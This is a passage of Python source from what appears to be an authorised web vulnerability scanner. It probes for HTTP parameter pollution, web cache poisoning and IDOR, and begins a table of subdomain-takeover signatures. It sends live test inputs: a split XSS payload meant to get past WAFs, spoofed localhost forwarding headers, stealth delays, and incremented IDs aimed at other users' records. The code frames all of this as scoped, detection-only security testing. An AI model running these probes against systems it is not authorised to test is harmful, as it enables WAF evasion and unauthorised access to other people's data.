         duplicating split a payload around a WAF filter boundary?
      3. Frontend/backend discrepancy  ?param=safe&param=payload  — does the
         response body echo either value unexpectedly?

    Severity:
      HIGH   — duplicate parameter changes auth/session-relevant response
               (cookie Set, redirect to admin path, privilege keyword in body)
      MEDIUM — WAF bypass confirmed (first request blocked/400, second not) OR
               canary reflected only from second value, not first
      LOW    — canary appears in response at all (unexpected behaviour worth noting)

    Detection only — no destructive payloads, no session manipulation beyond
    confirming parsing behaviour.
    Deduplicates per (base_url, param).
    8-second timeout per probe.
    Only called when --active-probes is enabled.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="ignore")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    # Build candidate URL list: current page + hrefs + form actions
    all_urls = [page_url]
    for tag in soup.find_all(["a", "form"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected]"

    for raw_url in all_urls:
        try:
            resolved = urljoin(page_url, raw_url)
            parsed   = urlparse(resolved)
            if is_third_party_cdn(parsed.netloc):
                continue
            if not parsed.query:
                continue
            if _SQLI_STATIC_RE.search(parsed.path):
                continue
            base = parsed.scheme + "://" + parsed.netloc + parsed.path
            # Preserve all params in insertion order
            param_pairs: list[tuple[str, str]] = []
            for pair in parsed.query.split("&"):
                if "=" in pair:
                    k, v = pair.split("=", 1)
                    param_pairs.append((k, v))
        except Exception:
            continue

        if not param_pairs:
            continue

        for param, orig_val in param_pairs:
            test_key = (base, param)
            if test_key in _hpp_tested:
                continue
            _hpp_tested.add(test_key)

            print(timestamp() + f" HPP probe: {base} param={param}")
            stealth_delay(domain)

            # Build the baseline query string (original, single values)
            def _qs(overrides: dict[str, list[str]]) -> str:
                """Build a query string; overrides replaces values for named params."""
                parts = []
                seen = set()
                for k, v in param_pairs:
                    if k in overrides and k not in seen:
                        for ov in overrides[k]:
                            parts.append(f"{k}={ov}")
                        seen.add(k)
                    elif k not in overrides:
                        parts.append(f"{k}={v}")
                return "&".join(parts)

            # ── Baseline (multi-sample via _get_endpoint_baseline) ───────────
            _hpp_bl = _get_endpoint_baseline(base, dict(param_pairs))
            if _hpp_bl is None:
                continue
            baseline_status = _hpp_bl.status_code
            baseline_body   = _hpp_bl.body

            # ── Probe 1A: orig first, canary second ?param=orig&param=canary ─
            url_1a = base + "?" + _qs({param: [orig_val, _HPP_CANARY]})
            # ── Probe 1B: canary first, orig second ?param=canary&param=orig ─
            url_1b = base + "?" + _qs({param: [_HPP_CANARY, orig_val]})

            body_1a = body_1b = ""
            status_1a = status_1b = None
            cookies_1a: dict = {}
            try:
                r = _get_session().get(url_1a, headers=create_request_header(),
                                       timeout=8, allow_redirects=True, verify=False)
                status_1a = r.status_code
                body_1a   = r.text or ""
                cookies_1a = dict(r.cookies)
                stealth_delay(domain)
            except Exception:
                pass
            try:
                r = _get_session().get(url_1b, headers=create_request_header(),
                                       timeout=8, allow_redirects=True, verify=False)
                status_1b = r.status_code
                body_1b   = r.text or ""
                stealth_delay(domain)
            except Exception:
                pass

            # ── Probe 2: WAF-bypass split ?param=<scr&param=ipt>... ──────────
            # First send the full unsplit payload — if blocked it supports bypass theory
            xss_full = f"{_HPP_XSS_SPLIT[0]}{_HPP_XSS_SPLIT[1]}alert(1)</script>"
            url_xss_single = base + "?" + _qs({param: [xss_full]})
            url_xss_split  = base + "?" + _qs({param: [_HPP_XSS_SPLIT[0],
                                                        _HPP_XSS_SPLIT[1] + "alert(1)</script>"]})
            status_xss_single = status_xss_split = None
            body_xss_split = ""
            try:
                r = _get_session().get(url_xss_single, headers=create_request_header(),
                                       timeout=8, allow_redirects=False, verify=False)
                status_xss_single = r.status_code
                stealth_delay(domain)
            except Exception:
                pass
            try:
                r = _get_session().get(url_xss_split, headers=create_request_header(),
                                       timeout=8, allow_redirects=False, verify=False)
                status_xss_split = r.status_code
                body_xss_split   = r.text or ""
                stealth_delay(domain)
            except Exception:
                pass

            # ── Analysis ─────────────────────────────────────────────────────
            _AUTH_KEYWORDS = frozenset({
                "admin", "dashboard", "privilege", "role", "superuser",
                "moderator", "staff", "welcome", "logged in", "sign out",
            })

            detail_prefix = (
                f"HTTP Parameter Pollution on param '{param}' at {base} — "
                f"original value: {orig_val!r}.{waf_note}"
            )

            # HIGH — duplicate param triggers auth/session change
            auth_hit = False
            for body_check, lbl in [(body_1a, "second-value"), (body_1b, "first-value")]:
                if any(kw in body_check.lower() for kw in _AUTH_KEYWORDS) \
                        and not any(kw in baseline_body.lower() for kw in _AUTH_KEYWORDS):
                    alert(
                        "HTTP PARAMETER POLLUTION (AUTH/PRIVILEGE CHANGE)",
                        "HIGH",
                        base,
                        detail_prefix + (
                            f" Duplicating param with canary ({lbl} taken) introduced "
                            f"auth/privilege keywords absent in baseline. "
                            f"Values tested: {orig_val!r} + {_HPP_CANARY!r}."
                        ),
                    )
                    print(timestamp() + f" [!!] HPP auth change on param={param} at {base}")
                    auth_hit = True
                    break

            if auth_hit:
                continue

            # MEDIUM — WAF bypass: single payload blocked (4xx) but split succeeded (2xx)
            if (status_xss_single is not None and status_xss_split is not None
                    and status_xss_single in (400, 403, 406, 429)
                    and status_xss_split not in (400, 403, 406, 429)):
                alert(
                    "HTTP PARAMETER POLLUTION (WAF BYPASS)",
                    "MEDIUM",
                    base,
                    detail_prefix + (
                        f" Single-param XSS payload returned {status_xss_single} (blocked), "
                        f"but split across two duplicate params returned {status_xss_split} "
                        f"(not blocked) — WAF may concatenate or use only one value. "
                        f"Split payload: {_HPP_XSS_SPLIT[0]!r} + {_HPP_XSS_SPLIT[1]!r}."
                    ),
                )
                print(timestamp() + f" [!] HPP WAF bypass on param={param} at {base}")
                continue

            # MEDIUM — canary only reflected when it is the second (last-wins) value
            canary_in_1a = _HPP_CANARY in body_1a   # canary is second — reflected if last-wins
            canary_in_1b = _HPP_CANARY in body_1b   # canary is first  — reflected if first-wins
            if canary_in_1a and not canary_in_1b:
                alert(
                    "HTTP PARAMETER POLLUTION (LAST-WINS PARSING)",
                    "MEDIUM",
                    base,
                    detail_prefix + (
                        f" Canary '{_HPP_CANARY}' reflected only when it is the second "
                        f"(last) duplicate value — server uses last occurrence. "
                        f"Probes: {url_1a!r} (canary reflected) vs {url_1b!r} (not reflected)."
                    ),
                )
                print(timestamp() + f" [!] HPP last-wins on param={param} at {base}")
            elif canary_in_1b and not canary_in_1a:
                alert(
                    "HTTP PARAMETER POLLUTION (FIRST-WINS PARSING)",
                    "MEDIUM",
                    base,
                    detail_prefix + (
                        f" Canary '{_HPP_CANARY}' reflected only when it is the first "
                        f"duplicate value — server uses first occurrence. "
                        f"Probes: {url_1b!r} (canary reflected) vs {url_1a!r} (not reflected)."
                    ),
                )
                print(timestamp() + f" [!] HPP first-wins on param={param} at {base}")

            # LOW — canary appears in either response (unexpected parameter behaviour)
            elif canary_in_1a or canary_in_1b:
                alert(
                    "HTTP PARAMETER POLLUTION (UNEXPECTED REFLECTION)",
                    "LOW",
                    base,
                    detail_prefix + (
                        f" Canary '{_HPP_CANARY}' reflected in response to duplicate-param "
                        f"probe — server processes duplicate values in an unexpected way. "
                        f"Reflected in: {'both probes' if canary_in_1a and canary_in_1b else '1A' if canary_in_1a else '1B'}."
                    ),
                )
                print(timestamp() + f" [*] HPP canary reflection on param={param} at {base}")


# ─────────────────────────────────────────────
# Web cache poisoning detection
# ─────────────────────────────────────────────

_WCP_CANARY      = "cache-probe-8b2c"
_WCP_UNKEYED_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-Host",           _WCP_CANARY + ".com"),
    ("X-Forwarded-Scheme",         _WCP_CANARY),
    ("X-Original-URL",             "/" + _WCP_CANARY),
    ("X-Rewrite-URL",              "/" + _WCP_CANARY),
    ("X-Custom-IP-Authorization",  "127.0.0.1"),
    ("X-Forwarded-For",            "127.0.0.1"),
]

# Headers whose presence in a crawled response suggest caching is active
_WCP_CACHE_INDICATOR_HEADERS = frozenset({
    "x-cache", "cf-cache-status", "x-amz-cf-id", "x-amz-cf-pop",
    "x-cache-hits", "x-served-by", "x-varnish", "age",
    "cdn-cache-control", "surrogate-control",
})

# Static file extensions that browsers/CDNs cache aggressively
_WCP_STATIC_RE = re.compile(
    r'\.(js|css|html?|json|xml|svg|ico|woff2?|ttf|eot)(\?|$)',
    re.IGNORECASE,
)

_wcp_tested: set = set()   # (base_url, header_name) pairs already probed


def _wcp_is_cacheable(url: str, response_headers: dict) -> bool:
    """
    Return True if the response looks like it may be cached.
    Checks: Cache-Control public/max-age, Vary header, CDN indicator
    headers, or static file extension.
    """
    path = urlparse(url).path
    if _WCP_STATIC_RE.search(path):
        return True
    h = {k.lower(): v for k, v in (response_headers or {}).items()}
    cc = h.get("cache-control", "")
    if "public" in cc or "max-age" in cc:
        return True
    if h.get("vary"):
        return True
    if any(ind in h for ind in _WCP_CACHE_INDICATOR_HEADERS):
        return True
    return False


def _wcp_canary_in_response(resp, canary: str) -> tuple[bool, str]:
    """
    Check whether *canary* appears in the response body or any header value.
    Returns (found: bool, location: str).
    """
    for hdr_name, hdr_val in resp.headers.items():
        if canary.lower() in hdr_val.lower():
            return True, f"response header '{hdr_name}: {hdr_val}'"
    body = resp.text or ""
    if canary.lower() in body.lower():
        pos  = body.lower().find(canary.lower())
        snip = body[max(0, pos - 60): pos + len(canary) + 60].strip()
        return True, f"response body snippet: {snip!r}"
    return False, ""


# ── URL-reflection FP filter for parameter cloaking ──────────────────────────

# Attribute patterns whose value is always a URL — the canary is just reflected
_CLOAK_URL_ATTR_RE = re.compile(
    r'(?:src|href|action|data-url|data-href|data-src)\s*=\s*["\'][^"\']*$',
    re.IGNORECASE,
)
# Meta-tag patterns whose content is a URL, not a processed value
_CLOAK_META_URL_RE = re.compile(
    r'(?:property\s*=\s*["\']og:url["\']'
    r'|name\s*=\s*["\'](?:canonical|twitter:url)["\'])',
    re.IGNORECASE,
)
# Analytics / tracking snippet patterns — the URL is passed as an argument
_CLOAK_ANALYTICS_RE = re.compile(
    r'(?:gtag|ga|fbq|_paq|dataLayer\.push|analytics\.track|trackPageview)\s*\(',
    re.IGNORECASE,
)


def _cloak_is_url_only_reflection(canary: str, body: str) -> bool:
    """
    Return True if every occurrence of *canary* in *body* sits inside a
    URL-carrying context that indicates simple URL reflection rather than
    genuine backend parameter processing.

    Suppressed contexts (evaluated via look-behind / surrounding window):
      • src= / href= / action= / data-url= attribute values
      • <link rel="canonical"> and <meta property="og:url"> tags
      • Analytics / tracking function calls (gtag, ga, fbq, _paq, dataLayer)

    Returns False (do not suppress) when at least one occurrence falls
    outside all of these contexts — i.e. the backend produced the value
    as plain text or in a non-URL structural position.

    Returns False immediately if *canary* is not present (caller's guard).
    """
    pos = 0
    found_any = False
    while True:
        idx = body.find(canary, pos)
        if idx == -1:
            break
        found_any = True
        pre    = body[max(0, idx - 300): idx]
        window = body[max(0, idx - 400): idx + 400]
        if _CLOAK_URL_ATTR_RE.search(pre):
            pos = idx + 1
            continue
        if _CLOAK_META_URL_RE.search(window):
            pos = idx + 1
            continue
        if _CLOAK_ANALYTICS_RE.search(pre):
            pos = idx + 1
            continue
        # At least one occurrence is NOT in a URL context
        return False
    return found_any  # True → all occurrences were URL-only → suppress


def check_web_cache_poisoning(page_url: str, html_content,
                               response_headers: dict) -> None:
    """
    Web cache poisoning detection via safe unkeyed header injection.

    Only runs on endpoints that look cacheable (Cache-Control: public/max-age,
    CDN indicator headers, Vary header, or static file extensions).

    Three detection classes:
      1. Unkeyed header injection — sends each probe header individually;
         flags HIGH if the injected value is reflected in the response body
         or any response header (Location, Link, etc.).
      2. Fat GET — sends a GET with a conflicting body param; flags MEDIUM
         if the body value appears in the response instead of the URL value.
      3. Parameter cloaking — appends canary param after semicolon delimiter;
         flags MEDIUM if the cloaked value appears in the response.

    Safety rules enforced:
      - One probe per (endpoint, header/test) — never re-sends the same
        poisoned header to avoid cache pollution for real users.
      - Canary is a harmless string — no XSS or HTML payloads.
      - Stops testing an endpoint the moment a reflection is confirmed.
      - Does NOT fetch the cached copy — detecting reflection in the direct
        response is sufficient; manual verification confirms cacheability.

    Deduplicates per (base_url, test_name).
    8-second timeout per probe.
    Only called when --active-probes is enabled.
    """
    if not is_in_scope(page_url):
        return
    domain = urlparse(page_url).netloc
    if is_third_party_cdn(domain):
        return
    if not _wcp_is_cacheable(page_url, response_headers):
        return

    parsed  = urlparse(page_url)
    base    = parsed.scheme + "://" + parsed.netloc + parsed.path

    waf_note = ""
    waf_vendor = _waf_results.get(domain)
    if waf_vendor:
        waf_note = f" [WAF: {waf_vendor} detected — manual verification required]"

    # Build cache indicator summary for finding detail
    h_lower = {k.lower(): v for k, v in (response_headers or {}).items()}
    cache_indicators = [
        f"{k}: {h_lower[k]}" for k in sorted(_WCP_CACHE_INDICATOR_HEADERS)
        if k in h_lower
    ]
    cc_val = h_lower.get("cache-control", "")
    if cc_val:
        cache_indicators.insert(0, f"cache-control: {cc_val}")
    cache_summary = "; ".join(cache_indicators) if cache_indicators else "static extension"

    # ── Endpoint baseline for anomaly gating ─────────────────────────────────
    parsed_wcp = urlparse(page_url)
    wcp_params = {}
    for pair in (parsed_wcp.query or "").split("&"):
        if "=" in pair:
            _wk, _wv = pair.split("=", 1)
            wcp_params[_wk] = _wv
    _wcp_bl = _get_endpoint_baseline(base, wcp_params)

    # ── 1. Unkeyed header injection ───────────────────────────────────────────
    for hdr_name, hdr_val in _WCP_UNKEYED_HEADERS:
        test_key = (base, hdr_name)
        if test_key in _wcp_tested:
            continue
        _wcp_tested.add(test_key)

        canary = hdr_val   # the injected value is our canary
        print(timestamp() + f" WCP probe: {base} header={hdr_name}: {hdr_val}")
        stealth_delay(domain)
        try:
            probe_headers = {**create_request_header(), hdr_name: hdr_val}
            resp = _get_session().get(
                base,
                headers=probe_headers,
                timeout=8,
                allow_redirects=False,   # don't follow — Location reflection is the signal
                verify=False,
            )
        except Exception:
            continue

        reflected, location = _wcp_canary_in_response(resp, canary)
        if reflected:
            _wcp_anom, _wcp_reason = _is_probe_anomalous(
                _wcp_bl, resp.text or "", resp.status_code
            )
            if _wcp_bl is not None and not _wcp_anom:
                print(timestamp() + f" [Baseline] WCP header {hdr_name} reflected but "
                      f"response not anomalous ({_wcp_reason}) — suppressing")
                continue
            alert(
                "WEB CACHE POISONING: UNKEYED HEADER REFLECTED",
                "HIGH",
                base,
                f"Injected header '{hdr_name}: {hdr_val}' was reflected in the response "
                f"({location}) — if this response is cached, downstream users will receive "
                f"the poisoned value. Cache indicators: {cache_summary}.{waf_note} "
                f"Manual verification required to confirm actual cache storage.",
            )
            print(timestamp() + f" [!!] WCP unkeyed header reflected: {hdr_name} at {base}")
            return   # stop — one confirmed reflection is enough; don't risk further poisoning

    # ── 2. Fat GET detection ─────────────────────────────────────────────────
    # Only attempt if the URL has an existing query parameter to conflict with
    fat_key = (base, "__fat_get__")
    if fat_key not in _wcp_tested and parsed.query:
        _wcp_tested.add(fat_key)
        # Pick first param name from query string
        first_param = parsed.query.split("&")[0].split("=")[0]
        fat_canary  = _WCP_CANARY + "-fat"
        print(timestamp() + f" WCP fat-GET probe: {base} param={first_param}")
        stealth_delay(domain)
        try:
            resp = _get_session().get(
                page_url,
                headers=create_request_header(),
                data=f"{first_param}={fat_canary}",
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            body = resp.text or ""
            if fat_canary in body:
                pos  = body.find(fat_canary)
                snip = body[max(0, pos - 60): pos + len(fat_canary) + 60].strip()
                alert(
                    "WEB CACHE POISONING: FAT GET DETECTED",
                    "MEDIUM",
                    base,
                    f"Server reflected body parameter '{first_param}={fat_canary}' in a GET "
                    f"request response (snippet: {snip!r}). Fat GET handling may allow cache "
                    f"poisoning if the body parameter overrides the URL parameter and the "
                    f"response is cached by key on the URL alone. "
                    f"Cache indicators: {cache_summary}.{waf_note}",
                )
                print(timestamp() + f" [!] WCP fat GET on param={first_param} at {base}")
                return
        except Exception:
            pass

    # ── 3. Parameter cloaking ────────────────────────────────────────────────
    cloak_key = (base, "__cloak__")
    if cloak_key not in _wcp_tested:
        _wcp_tested.add(cloak_key)
        cloak_canary = "cloak-probe-9d4e"
        # Append after semicolon — some caches strip the semicolon-delimited
        # portion from the cache key while backends process it
        if parsed.query:
            cloak_url = page_url + f";param={cloak_canary}"
        else:
            cloak_url = base + f"?param={cloak_canary}"
        print(timestamp() + f" WCP cloak probe: {cloak_url}")
        stealth_delay(domain)
        try:
            resp = _get_session().get(
                cloak_url,
                headers=create_request_header(),
                timeout=8,
                allow_redirects=False,
                verify=False,
            )
            body = resp.text or ""
            if cloak_canary not in body:
                pass  # canary absent — no finding
            elif _cloak_is_url_only_reflection(cloak_canary, body):
                # Canary only appeared inside src=/href=/og:url/analytics —
                # this is URL reflection, not backend parameter processing.
                print(timestamp() + f" [~] WCP cloak suppressed (URL-only reflection) at {base}")
            else:
                # Canary appeared in a meaningful position.  Secondary check:
                # fetch the original URL without the cloaked parameter and
                # compare responses.  If identical (after removing the canary),
                # the server ignored the parameter and the reflection is noise.
                _suppress_baseline = False
                stealth_delay(domain)
                try:
                    base_resp = _get_session().get(
                        page_url,
                        headers=create_request_header(),
                        timeout=8,
                        allow_redirects=False,
                        verify=False,
                    )
                    base_body = base_resp.text or ""
                    stripped  = body.replace(cloak_canary, "").strip()
                    if stripped == base_body.strip():
                        _suppress_baseline = True
                        print(
                            timestamp() +
                            f" [~] WCP cloak suppressed (baseline identical) at {base}"
                        )
                except Exception:
                    pass  # baseline fetch failed — fall through to alert

                if not _suppress_baseline:
                    pos  = body.find(cloak_canary)
                    snip = body[max(0, pos - 60): pos + len(cloak_canary) + 60].strip()
                    alert(
                        "WEB CACHE POISONING: PARAMETER CLOAKING DETECTED",
                        "MEDIUM",
                        base,
                        f"Semicolon-cloaked parameter 'param={cloak_canary}' appeared in the "
                        f"response body (snippet: {snip!r}) at {cloak_url}. If the cache key "
                        f"excludes the semicolon-delimited suffix, an attacker can inject values "
                        f"processed by the backend but invisible to the cache key. "
                        f"Cache indicators: {cache_summary}.{waf_note}",
                    )
                    print(timestamp() + f" [!] WCP parameter cloaking at {base}")
        except Exception:
            pass


# ─────────────────────────────────────────────
# IDOR parameter detection (with auto-verification)
# ─────────────────────────────────────────────

IDOR_PARAM_NAMES = {
    "id", "user_id", "userId", "account_id", "accountId",
    "order_id", "orderId", "invoice_id", "invoiceId",
    "file_id", "fileId", "doc_id", "docId", "document_id",
    "ticket_id", "ticketId", "report_id", "reportId",
    "customer_id", "customerId", "profile_id", "profileId",
    "message_id", "messageId", "post_id", "postId",
    "record_id", "recordId", "item_id", "itemId",
    "ref", "reference", "uid", "guid", "uuid",
    "pid", "rid", "oid", "vid", "sid",
}

# REST path regex — numeric (3+ digits) or UUID
IDOR_PATH_REGEX = re.compile(
    r'/(?:api|v\d+)?/?\w+/(\d{3,}|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:/|$)',
    re.I
)

# Path segments that are never user-data IDOR targets
IDOR_PATH_BLOCKLIST = re.compile(
    r'/(?:css|js|assets|images|img|fonts|static|media|generated|optimized|'
    r'cache|dist|build|public|vendor|lib|libs|node_modules|'
    r'uploads|upload|files|file|attachments|attachment|downloads|download|'
    r'storage|content|resources|resource|archive|archives|'
    r'answers|articles|help|faq|kb|knowledge|docs|documentation|'
    r'blog|news|press|events|about|contact|legal|privacy|terms|'
    r'wp-content|wp-includes|themes|plugins)/',
    re.I
)

# File extensions that are never IDOR targets
IDOR_EXT_BLOCKLIST = re.compile(
    r'\.(css|js|png|jpg|jpeg|gif|svg|ico|woff|woff2|ttf|eot|map|'
    r'pdf|zip|tar|gz|xml|json|txt|md|csv|'
    r'mp4|mp3|mov|avi|mkv|webm|ogg|wav|flac|'
    r'doc|docx|xls|xlsx|ppt|pptx|'
    r'psd|ai|eps|tiff|bmp|raw)(\?|$)',
    re.I
)

_idor_reported  = set()   # (domain, endpoint_pattern, param) already verified+reported
_idor_tested    = set()   # (endpoint, param) already run verification on

def _idor_response_fingerprint(resp):
    """
    Return a tuple that characterises a response for diffing:
    (status_code, content_length, has_auth_redirect, body_sample)
    body_sample is the first 4000 chars of the response, used for
    similarity comparison via difflib.SequenceMatcher.
    """
    if resp is None:
        return None
    status = resp.status_code
    size   = len(resp.content)
    auth_redirect = any(kw in resp.url for kw in
                        ("login", "signin", "sign-in", "auth", "sso", "session"))
    body_sample = resp.text[:4000] if resp.text else ""
    return (status, size, auth_redirect, body_sample)

def _idor_requires_auth(url):
    """
    Fetch URL without any session cookies. If we get a redirect to login
    or a 401/403, the endpoint is auth-gated — worth IDOR testing.
    Returns (requires_auth: bool, response_fingerprint)
    """
    try:
        # Use a clean session with no cookies
        stealth_delay(urlparse(url).netloc)
        resp = _get_session().get(
            url,
            headers=create_request_header(),
            cookies={},
            timeout=6,
            allow_redirects=True,
        )
        fp = _idor_response_fingerprint(resp)
        if resp.status_code in (401, 403):
            return True, fp
        # Redirected to login page
        if any(kw in resp.url for kw in ("login", "signin", "sign-in", "auth", "sso")):
            return True, fp
        # Response contains login form markers
        if any(kw in resp.text.lower() for kw in
               ("login-form", "sign in", "please log in", "you must be logged")):
            return True, fp
        return False, fp
    except Exception:
        return False, None

def _idor_substitute_id(url, param, original_id, kind):
    """
    Return a modified URL with the ID incremented/decremented by 1.
    For query params: replace param value.
    For path IDs: replace the numeric segment.
    Returns list of (label, test_url) tuples.
    """
    variants = []
    try:
        if kind == "query_param":
            parsed = urlparse(url)
            # Build ±1 variants
            for delta, label in [(1, "id+1"), (-1, "id-1")]:
                new_id = str(int(original_id) + delta)
                new_query = "&".join(
                    f"{k}={new_id}" if k == param else f"{k}={v}"
                    for k, v in (p.split("=", 1) for p in parsed.query.split("&") if "=" in p)
                )
                variants.append((label, parsed._replace(query=new_query).geturl()))
        elif kind == "rest_path":
            # Replace numeric ID in path
            for delta, label in [(1, "id+1"), (-1, "id-1")]:
                new_id = str(int(original_id) + delta)
                new_url = re.sub(
                    r'(/)(' + re.escape(original_id) + r')(/|$)',
                    lambda m: m.group(1) + new_id + m.group(3),
                    url, count=1
                )
                if new_url != url:
                    variants.append((label, new_url))
    except Exception:
        pass
    return variants

def verify_idor_candidate(base_url, endpoint, param, value, kind):
    """
    Full 5-stage IDOR verification pipeline:

    1. Path blocklist  — skip CSS/JS/assets/public-content paths
    2. Extension check — skip static file extensions
    3. Auth-gate check — skip endpoints accessible without a session
    4. ID substitution — fetch ID±1, compare response fingerprints
    5. Response diff   — only alert if different IDs return meaningfully
                         different responses (proving per-object data)

    Returns True if confirmed worth alerting, False otherwise.
    """
    parsed = urlparse(endpoint)
    path   = parsed.path

    # ── Stage 1: Path blocklist ───────────────────────────────
    if IDOR_PATH_BLOCKLIST.search(path):
        return False

    # ── Stage 2: Extension blocklist ─────────────────────────
    if IDOR_EXT_BLOCKLIST.search(path + "?" + parsed.query):
        return False

    # ── Stage 3: Auth-gate check ──────────────────────────────
    # Build the real URL with the original ID value
    if kind == "query_param":
        real_url = endpoint + "?" + param + "=" + value
    else:
        real_url = re.sub(r'\{id\}', value, endpoint)

    requires_auth, real_fp = _idor_requires_auth(real_url)
    if not requires_auth:
        return False   # Public endpoint — not interesting

    # ── Stage 4 & 5: ID substitution + response diff ─────────
    variants = _idor_substitute_id(real_url, param, value, kind)
    if not variants:
        # Can't generate variants (UUID or non-numeric) — log as unverified candidate
        return True  # Still worth human review if auth-gated

    fingerprints = []
    for label, test_url in variants:
        try:
            stealth_delay(urlparse(test_url).netloc)
            resp = _get_session().get(
                test_url,
                headers=create_request_header(),
                cookies={},
                timeout=6,
                allow_redirects=True,
            )
            fingerprints.append((label, _idor_response_fingerprint(resp)))
        except Exception:
            continue

    if not fingerprints:
        return False

    # Compare real response to variants using text similarity.
    # If responses are >85% similar across all variants, the endpoint returns
    # the same content regardless of ID — not per-object data (not IDOR).
    # If responses differ meaningfully (similarity <85%) — likely real IDOR.
    import difflib as _difflib
    real_status, _, _, real_body = real_fp
    all_404 = all(fp[0] == 404 for _, fp in fingerprints if fp)
    if all_404:
        return False   # Adjacent IDs don't exist — sparse ID space, low risk

    similarities = []
    for _, fp in fingerprints:
        if not fp:
            continue
        variant_body = fp[3]
        ratio = _difflib.SequenceMatcher(None, real_body, variant_body).quick_ratio()
        similarities.append(ratio)

    if not similarities:
        return False

    # All variants are >85% similar to the real response — same template, no per-object data
    if all(r > 0.85 for r in similarities):
        return False

    return True   # Responses differ meaningfully per ID on auth-gated endpoint — real candidate


# Social media platforms use public numeric/UUID identifiers by design.
# IDOR checks on these domains produce only noise.
_IDOR_SKIP_DOMAINS = {
    "facebook.com", "instagram.com", "twitter.com", "x.com",
    "youtube.com", "linkedin.com", "tiktok.com", "pinterest.com", "reddit.com",
}

def check_idor_candidates(page_url, html_content):
    """
    Collect IDOR candidates from page links, then run full verification
    pipeline on each unique (endpoint, param) pair before alerting.
    Alerts only on confirmed auth-gated endpoints with per-object data.
    """
    if _stop_event.is_set():
        return
    domain = urlparse(page_url).netloc
    base_domain = domain.lstrip("www.")
    if any(base_domain == d or base_domain.endswith("." + d) for d in _IDOR_SKIP_DOMAINS):
        return

    try:
        text = html_content if isinstance(html_content, str) \
               else html_content.decode("utf-8", errors="replace")
        soup = BeautifulSoup(text, "lxml")
    except Exception:
        return

    candidates = set()
    all_urls   = [page_url]
    for tag in soup.find_all(["a", "form", "link"]):
        href = tag.get("href") or tag.get("action") or ""
        if href:
            all_urls.append(href)

    # ── Collect query param candidates ────────────────────────
    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            if not parsed.query:
                continue
            for pair in parsed.query.split("&"):
                if "=" not in pair:
                    continue
                k, v = pair.split("=", 1)
                if k.lower() not in {p.lower() for p in IDOR_PARAM_NAMES}:
                    continue
                if re.match(r'^\d{2,}$', v) or re.match(
                    r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', v, re.I
                ):
                    endpoint = parsed.scheme + "://" + parsed.netloc + parsed.path
                    candidates.add((endpoint, k, v, "query_param"))
        except Exception:
            continue

    # ── Collect REST path candidates ──────────────────────────
    for raw_url in all_urls:
        try:
            resolved_url = urljoin(page_url, raw_url)
            parsed = urlparse(resolved_url)
            for match in IDOR_PATH_REGEX.finditer(parsed.path):
                id_val  = match.group(1)
                pattern = IDOR_PATH_REGEX.sub(
                    lambda m: m.group(0).replace(m.group(1), "{id}"), parsed.path
                )
                base    = parsed.scheme + "://" + parsed.netloc if parsed.scheme else \
                          urlparse(page_url).scheme + "://" + urlparse(page_url).netloc
                endpoint = base + pattern
                candidates.add((endpoint, "path_id", id_val, "rest_path"))
        except Exception:
            continue

    # ── Verify each candidate before alerting ─────────────────
    for endpoint, param, value, kind in candidates:
        if not is_in_scope(endpoint):
            continue
        test_key   = (endpoint, param)
        report_key = (domain, endpoint, param)

        if test_key in _idor_tested or report_key in _idor_reported:
            continue
        _idor_tested.add(test_key)

        print(timestamp() + f" IDOR verify: {endpoint} param={param} value={value}")
        confirmed = verify_idor_candidate(endpoint, endpoint, param, value, kind)

        if confirmed:
            _idor_reported.add(report_key)
            detail = f"[{kind}] Verified auth-gated endpoint with per-object data. " \
                     f"Param '{param}' = '{value}'. Modify ID to access other users' records."
            write_to_js_database(page_url, endpoint, "idor_candidate", detail)
            alert(
                "IDOR CANDIDATE — VERIFIED",
                "HIGH",
                endpoint,
                detail + f" Source: {page_url}"
            )
            print(timestamp() + f" [!!] IDOR verified: {endpoint} param={param}")
        else:
            print(timestamp() + f" IDOR dismissed (not auth-gated or no per-object diff): {endpoint}")



# CNAME fingerprints: service name → (cname_patterns, body_fingerprints, confirm_required)
# confirm_required=True  → body fingerprint must match before HIGH alert;
#                          "no response" only generates MEDIUM (used for services
#                          whose infrastructure is hard to claim externally, e.g.
#                          Azure cloudapp.net internal load balancers).
# confirm_required=False → dangling CNAME with no response is sufficient for HIGH.
TAKEOVER_SIGNATURES = {
    "github-pages":      (["github.io"],                  ["There isn't a GitHub Pages site here",
                                                            "For root URLs (like http://example.com/) you must provide an index.html"],
                                                           False),
    "heroku":            (["herokudns.com", "herokussl.com", "herokuapp.com"],
                                                          ["No such app", "herokucdn.com/error-pages/no-such-app"],
                                                           False),
    "aws-s3":            (["s3.amazonaws.com", "s3-website"],
                                                          ["NoSuchBucket", "The specified bucket does not exist"],
                                                           False),
    # Azure App Service public endpoints (azurewebsites.net) — moderate confidence
    "azure-app":         (["azurewebsites.net", "azure-api.net"],
                                                          ["404 Web Site not found", "This web app has been stopped"],
                                                           False),
    # Azure internal load balancer (waws-prod-*.cloudapp.net) — body confirmation
    # required; these are Azure-internal infrastructure, not publicly claimable,
    # so a dangling CNAME with no response is very common and low-signal.
    "azure-scm":         (["cloudapp.net"],               ["404 Web Site not found", "This web app has been stopped"],
                                                           True),
    # AWS Elastic Beanstalk — internal DNS, require body confirm
    "aws-elastic-beanstalk": (["elasticbeanstalk.com"],   ["NXDOMAIN", "404 Not Found"],
                                                           True),
    "fastly":            (["fastly.net"],                 ["Fastly error: unknown domain"],
                                                           False),
    "shopify":           (["myshopify.com"],              ["Sorry, this shop is currently unavailable"],
                                                           False),
    "squarespace":       (["squarespace.com"],            ["No Such Account"],
                                                           False),
    "tumblr":            (["domains.tumblr.com"],         ["There's nothing here."],
                                                           False),
    "wordpress":         (["wordpress.com"],              ["Do you want to register"],
                                                           False),
